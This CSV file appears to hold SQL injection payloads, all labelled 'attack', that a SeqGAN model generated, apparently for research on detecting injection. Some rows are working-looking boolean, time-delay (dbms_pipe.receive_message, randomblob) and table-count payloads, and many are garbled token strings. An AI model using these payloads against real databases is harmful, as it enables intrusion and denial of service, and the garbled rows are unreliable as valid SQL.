label,payload,family,payload_type,method,run_id,sample_index
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1900
attack,"-8673""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1901
attack,"||chr  =    (  ,5  =    (  'qqpjq'(  112  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1902
attack,"select 8156  =    (     ""gzhp""  =   2367  =    (  (  ),5000000   where 4297  )  )  #  )   ab' like 'ner     eau=  (  (  ||  (  101  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1903
attack,"select_pasxserde'  =    (  101  )  79""  =  ""h",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1904
attack,"-"" or make_set  (  9354  =  9354,7185  )   and ""   '+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'nast  )  )   and +  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1905
attack,"  )   where 7552  =    (  )  )     ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1906
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1907
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1908
attack,"1%""  =  ""null  )   ag  (  (  (  103  )  )   )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1909
attack,"select cou't  (  69  =    (  )   'ootz' r  =    (  109  )  )    ,rdo",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1910
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1911
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1912
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1913
attack,1  )   where 7471  =    (  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1914
attack,1   )  )    )    )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1915
attack,select-   ppj||co' like 'n.ss as  (  (  66  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1916
attack,"-'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1917
attack,"1'  )  )   and    (  5  )  (  ,5  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1918
attack,"-2912""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1919
attack,"1%""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1920
attack,1)    )     )   where 8060500000000  x   xsunt  (  (  \,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1921
attack,select t  =    (  select cousegees_sers as where end t3  )dgouncousert  (  (  char  (  selectect  (  if  (  a  )  1041  (  69  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1922
attack,"-9688%'  =  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1923
attack,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uses aldt  )   fromderz  (    (  (  =  4062  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1924
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1925
attack,"dtaqqgereausesese  (  (  =  9687aoh  (  'abcdefg'fgesereses  (  (  9354  =  =   )    )      )   vapkakvkandctiuneseressasgeal  (  (  68  )  (  ,5  (  )  --'  =  '  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1926
attack,"1%'  )   or 8384  =  like  (  'abuwfpers as and 6414  =  5127  )  )   from gmag  (  =  )    )  ----""  =  ""zh",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1927
attack,select uxpeioeece  (ces  (  500000000/2 where where 4297  =  7471  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1928
attack,"-3596   )  )    )     )   aw""  =  ""kvumesew/akele",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1929
attack,select couuses 5333  112dmount  (  9607  =  5098,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1930
attack,1   )   where or whenoumsers aivauusert  (  (  (  (  (  69  )   8421  =    (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1931
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1932
attack,select 1  =    (  select count  (  (  116  )  ||c],boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1933
attack,1%'  )   or 8384  =  like  (  'agfinioeserte_ere_sesi(  9607,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1934
attack,"1   )    )     select uhpes  =  5333  )  )   a"" like ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1935
attack,"select end elsejn   from i(  9687""  =  ""n  (  *  )    )   from deas and    (  ,select counusumsusucst  ,rkomes  (  79  )  ||chr  (  (  (  _m' like '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1936
attack,"-'zj'   )    )    or 5903  =    (  'qandyuneuses  (  (  101  )  ""ymss""  =  h2  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1937
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1938
attack,"1%'  )   and 3202  =  like  (  '3707,allolesesamsyss t1,rdb$types as r t1,systabties as as t3  )  )      --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1939
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  ""\",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1940
attack,"-9688l  )  5127,5000000    (  --x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1941
attack,"-1422%%"" or make_set  (  9354  =  9354,7185  )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1942
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1943
attack,select 8189  =    (     (  select count  5098ahp   f  )   r,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1944
attack,"1 where 8482  =    (  116  )  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1945
attack,1nwnolltiont  (  65  x  )  (  --se,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1946
attack,1%'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1947
attack,dables as and    (  )  (  ||  (  *  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1948
attack,like where u  (  1041  =    (  101  )  (  )  1   )    )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1949
attack,"-Z  '  )   or 8384  =  like  (  '  )    )    (  1  )  ,r  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1950
attack,"select kemses t1,alyunte_es  (  ,5000000   )    (  (  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1951
attack,1  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1952
attack,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""easblusers as  =    (  1,)  )    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1953
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  )   and 3202  =  like  (  'abmstabl_sesystabsers t4  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1954
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""veheseawedt  )  )    )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1955
attack,"-2912""  )   ababmerat  (  116  =  =  84824297  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1956
attack,"1""  )    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1957
attack,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""abncouousteese  66  (  (  (  (  a  (  65  )  ,r  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1958
attack,"1'  )   and 3202  =  like  (  'aps ast,allaswstall__ss  qake_sesereserereresese(  (  (  load_file  (  *  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1959
attack,"1 where 7471  =    (  1  =  )    )   and 3202  =    (  ,'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||')  )    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1960
attack,"1    )  ,0  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1961
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1962
attack,"-4889%vd  )  ,5000000   )    )    )      (  =   from ibmnte_mesingert  (  (  500000000/2   )    )    )    )   8156  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1963
attack,1 where s t5  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1964
attack,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'euhrpersas,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1965
attack,1   )    )    )   and   (  65  )  ),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1966
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1967
attack,"-9688%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1968
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1969
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""k"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""wk+     3645pe",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1970
attack,"-4889%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1971
attack,"15  )   where   )  and count    =    (  ""gzhp""  =  2072 where 9687  =    (  (  500000000  )   agomascounere_useropes5  (  (  (  cchg  (  (  (  500000000'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'exsest  (  (  ||cqh  (  =    (  *  )   allmas t1,rdb$talltallt  (  87  )  (   (  )  )   wherea rsu  (  67",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1972
attack,select couspp,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1973
attack,"(  ||chr  (  =    (  ,5  )  )   and 'qjle'  selectawqzq'  )   and    (    (   'vce.seres",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1974
attack,select or 6414  =  1 and    (    (    (  112  )  68  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1975
attack,select t  )  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1976
attack,"1"" whereunusers whereu=    (  (  )  ,5000000   )   and     )   --r  )   and 8407  (  =  )  )    )vap",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1977
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '   rkhreerexecte  cas  (  116  )  ||chr  (  (  (  (  *  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1978
attack,1%'  )   or 8384  =  like  (  'ape5000000s al t  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1979
attack,"1,%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'wqsa.rp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1980
